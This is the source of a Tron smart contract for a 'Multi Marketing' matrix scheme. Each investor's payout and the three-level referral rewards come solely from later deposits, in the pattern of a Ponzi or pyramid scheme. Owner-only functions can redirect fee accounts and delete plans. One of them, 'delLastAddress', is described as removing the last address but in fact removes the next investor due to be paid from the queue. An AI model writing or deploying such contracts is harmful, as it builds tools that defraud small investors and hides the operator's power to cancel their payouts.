//SourceUnit: TronLine2.sol

pragma solidity 0.4.25;

/*
------------------------------------
Multi Marketing project
 Website:  https://x100tron.com  
 Project Website :  https://fastcash.x100tron.com  
 Chanel :  https://t.me/x100tronofficial
------------------------------------ 
 CONTRACT MANAGEMENT:
------------------------------------
Linear marketing, 3 user after your position give you 100% of your invest plan and reinvest
10% direct referral 👨 
8% referred level 2 👨🏽👨🏽
5% referred level 3 👨🏽👨�
*/

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct PositionData {
        uint256 planId;
        uint256 positionDate;
        uint256 positionSum;
    }

    struct Plan {
        uint256 OptionPlan;
        uint256 term;
        uint256 EndPositionNum;
        uint256 positionMinSum;
        uint256 positionMaxSum;
        uint256 afterClosedSum;
    }
    
    struct RowStructures {
        uint256 IdPlan;
        address[] structuremassive;
        uint256 alreadyposin;
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 PlansEarnings;
        uint256 availableToWithdraw;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => PositionData) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
    }
}

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

contract TronLine is Ownable {
    using SafeMath for uint256;
    uint256 public constant DEVELOPER_RATE = 0; // - 0%
    uint256 public constant MARKETING_RATE = 100; // - 10%
    uint256 public constant REFERENCE_RATE = 230; // - 23%
    uint256 public constant REFERENCE_LEVEL1_RATE = 100; // 10%
    uint256 public constant REFERENCE_LEVEL2_RATE = 80; // 8%
    uint256 public constant REFERENCE_LEVEL3_RATE = 50; // 5%
    uint256 public constant REFERRER_CODE = 1000;

    uint256 public latestReferrerCode;
    uint256 private totalTurnover_;

    address private developerAccount_;
    address private marketingAccount_;
    address private referenceAccount_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    Objects.Plan[] private investmentPlans_;
    Objects.RowStructures[] private rowPlanstoarr_;

    event onInvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        referenceAccount_ = msg.sender;
        _init();
    }

    function() external payable {
        if (msg.value == 0) {

        } else {
           // invest(0, 0); //default to buy plan 0, no referrer
        }
    }


    // Метод модифицирует адрес Marketing Account
    function setMarketingAccount(address _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }
    
    // Метод который удаляет последний в очереди адрес
    function delLastAddress(uint256 _planId) public onlyOwner returns (address) {
        
if(rowPlanstoarr_[_planId].structuremassive.length != 0) {
    for (uint i = 0; i<rowPlanstoarr_[_planId].structuremassive.length-1; i++){
            rowPlanstoarr_[_planId].structuremassive[i] = rowPlanstoarr_[_planId].structuremassive[i+1];
        }
        delete rowPlanstoarr_[_planId].structuremassive[rowPlanstoarr_[_planId].structuremassive.length-1];
        rowPlanstoarr_[_planId].structuremassive.length--;
        
        if(rowPlanstoarr_[_planId].structuremassive.length != 0) {
        rowPlanstoarr_[_planId].alreadyposin = 0;
        }
        
    }
    
}

    // Метод отдает MarketingAccount
    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }


    /**
    Метод изменяет адрес _newDeveloperAccount
    */
    function setDeveloperAccount(address _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    // Метод добавляет план
    function addNewPlan(uint256 _planId, uint256 _plantoEndnum, uint256 _planMinSum, uint256 _planMaxSum, uint256 _planRewardSum) public onlyOwner returns (uint256){
        address[] memory arressd;
        rowPlanstoarr_.push(Objects.RowStructures(_planId,arressd,0));
        rowPlanstoarr_[_planId].structuremassive.push(marketingAccount_);
        return investmentPlans_.push(Objects.Plan(_planId, 0, _plantoEndnum, _planMinSum, _planMaxSum,_planRewardSum)); 
    }
    
    // Метод удаляет план
function removePlan(uint256 _planId) public onlyOwner returns (uint256){
    address[] memory arressd;
        for (uint256 i = _planId; i<investmentPlans_.length-1; i++){
            investmentPlans_[i] = investmentPlans_[i+1];
        }
        delete investmentPlans_[investmentPlans_.length-1];
        investmentPlans_.length--;
        rowPlanstoarr_[_planId].structuremassive = arressd;
}

    // Метод отдает DeveloperAccount
    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    /**
    Метод модифицирует адрес референс аккаунта
    */
    function setReferenceAccount(address _newReferenceAccount) public onlyOwner {
        require(_newReferenceAccount != address(0));
        referenceAccount_ = _newReferenceAccount;
    }
    /**
    Метод отдает адрес референс аккаунта
    */
    function getReferenceAccount() public view onlyOwner returns (address) {
        return referenceAccount_;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        investmentPlans_.push(Objects.Plan(0, 0, 3, 499999999, 500000001,500000000)); //, 500 TRX After 3 user
        
       address[] memory arressd;
       rowPlanstoarr_.push(Objects.RowStructures(0,arressd,0));
       rowPlanstoarr_[0].structuremassive.push(marketingAccount_);
    }

    // Метод отдает матричные планы
    function getCurrentPlans() public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        uint256[] memory endpos = new uint256[](investmentPlans_.length);
        uint256[] memory posminsum = new uint256[](investmentPlans_.length);
        uint256[] memory posmaxsum = new uint256[](investmentPlans_.length);
        uint256[] memory rewardsum = new uint256[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.OptionPlan;
            terms[i] = plan.term;
            endpos[i] = plan.EndPositionNum;
            posminsum[i] = plan.positionMinSum;
            posmaxsum[i] = plan.positionMaxSum;
            rewardsum[i] = plan.afterClosedSum;
        }
        return
        (
        ids,
        interests,
        terms,
        endpos,
        posminsum,
        posmaxsum,
        rewardsum
        );
    }


    // Метод отдает общее количество инвестированныйх средств
    function getTotalTurnover() public view returns (uint256){
        return totalTurnover_;
    }

     // Метод отдает Количество занятых позиций после последнего действия распределения
    function getAlreadyPos(uint256 _planId) public view returns (uint256){
        return rowPlanstoarr_[_planId].alreadyposin;
    }
    
     // Метод отдает массив последних адрессов в очереди в определенном плане
    function getLastAddresses(uint256 _planId) public view returns (address[]){
        return rowPlanstoarr_[_planId].structuremassive;
    }

    // метод отдает количество средст на балансе
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // метод отдает
    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getUserInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        
        return
        (
        investor.referrerEarnings,
        investor.PlansEarnings,
        investor.availableToWithdraw,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.planCount
        );
    }

    function getLinePlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].positionDate!=0,"wrong position date");
            planIds[i] = investor.plans[i].planId;
            investmentDates[i] = investor.plans[i].positionDate;
            investments[i] = investor.plans[i].positionSum;
        }

        return
        (
        planIds,
        investmentDates,
        investments
        );
    }


function withdraw() public payable {
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        address addrs_ = msg.sender;
        uint256 uid = address2UID[addrs_];
        Objects.Investor storage investor = uid2Investor[uid];
        require(uid != 0, "Can not withdraw because no any positions");
        require(investor.availableToWithdraw > 0, "Your balance is empty");
       uint256 withdrawalAmount = 0;

        if (investor.availableToWithdraw > 0) {
            addrs_.transfer(investor.availableToWithdraw);
            investor.availableToWithdraw = 0;
        }

        emit onWithdraw(addrs_, withdrawalAmount);
  }



    function invest(uint256 _referrerCode, uint256 _planId) public payable {
        if (_invest(msg.sender, _planId, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function _Registration(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }
        }
        return (latestReferrerCode);
    }
    
    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong position plan id");
        require(_amount > investmentPlans_[_planId].positionMinSum, "Less than the minimum amount of plan requirement ");
        require(_amount < investmentPlans_[_planId].positionMaxSum, "Bigger than the maximum amount of plan requirement");
        uint256 uid = address2UID[_addr];
        //require(uid != 0, "You are not register");
        if (uid == 0) {
            uid = _Registration(_addr, _referrerCode);
            //new user
        } else {
            //old user
            //do nothing, referrer is permanent
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].positionDate = block.timestamp;
        investor.plans[planCount].positionSum = _amount;

        investor.planCount = investor.planCount.add(1);
        _calculateReferrerReward(_amount, investor.referrer);
        totalTurnover_ = totalTurnover_.add(_amount);
        
        address addrlast = msg.sender;
    if(rowPlanstoarr_[_planId].structuremassive.length != 0) {
    rowPlanstoarr_[_planId].alreadyposin = rowPlanstoarr_[_planId].alreadyposin.add(1);  
    }
    
if(rowPlanstoarr_[_planId].alreadyposin >= investmentPlans_[_planId].EndPositionNum) {
    rowPlanstoarr_[_planId].structuremassive.push(addrlast);
    uint256 SumToUser = investmentPlans_[_planId].afterClosedSum;
    
    uint256 uidtoearn = address2UID[rowPlanstoarr_[_planId].structuremassive[0]];
    Objects.Investor storage investorearn = uid2Investor[uidtoearn];
    investorearn.PlansEarnings = investorearn.PlansEarnings.add(SumToUser);
    investorearn.availableToWithdraw = investorearn.availableToWithdraw.add(SumToUser);
    _calculateReferrerReward(_amount, investorearn.referrer);
     
     rowPlanstoarr_[_planId].structuremassive.push(rowPlanstoarr_[_planId].structuremassive[0]);
    if(rowPlanstoarr_[_planId].structuremassive.length != 0) {
    for (uint i = 0; i<rowPlanstoarr_[_planId].structuremassive.length-1; i++){
            rowPlanstoarr_[_planId].structuremassive[i] = rowPlanstoarr_[_planId].structuremassive[i+1];
        }
        delete rowPlanstoarr_[_planId].structuremassive[rowPlanstoarr_[_planId].structuremassive.length-1];
        rowPlanstoarr_[_planId].structuremassive.length--;
    }
 
    rowPlanstoarr_[_planId].alreadyposin = 1;
    
} else {
    rowPlanstoarr_[_planId].structuremassive.push(addrlast);
}

        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(1000);
        //uid2Investor[address2UID[marketingAccount_]].availableToWithdraw = uid2Investor[address2UID[marketingAccount_]].availableToWithdraw.add(marketingPercentage);
        marketingAccount_.transfer(marketingPercentage);
        
        return true;
    }

    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {

        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
        
        if (_referrerCode != 0 && _referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _refAmount = 0;
            _allReferrerAmount = 0;

            if (_ref1 > 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                uid2Investor[_ref1].referrerEarnings = uid2Investor[_ref1].referrerEarnings.add(_refAmount);
                uid2Investor[_ref1].availableToWithdraw = uid2Investor[_ref1].availableToWithdraw.add(_refAmount);
            } else {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.add(_refAmount);
            }

            if (_ref2 > 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                uid2Investor[_ref2].referrerEarnings = uid2Investor[_ref2].referrerEarnings.add(_refAmount);
                uid2Investor[_ref2].availableToWithdraw = uid2Investor[_ref2].availableToWithdraw.add(_refAmount);
            } else {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.add(_refAmount);
            }

            if (_ref3 > 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
               // _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref3].referrerEarnings = uid2Investor[_ref3].referrerEarnings.add(_refAmount);
                uid2Investor[_ref3].availableToWithdraw = uid2Investor[_ref3].availableToWithdraw.add(_refAmount);
            } else {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.add(_refAmount);
            }
        }

        if (_allReferrerAmount > 0) {
            referenceAccount_.transfer(_allReferrerAmount);
        }
    }

}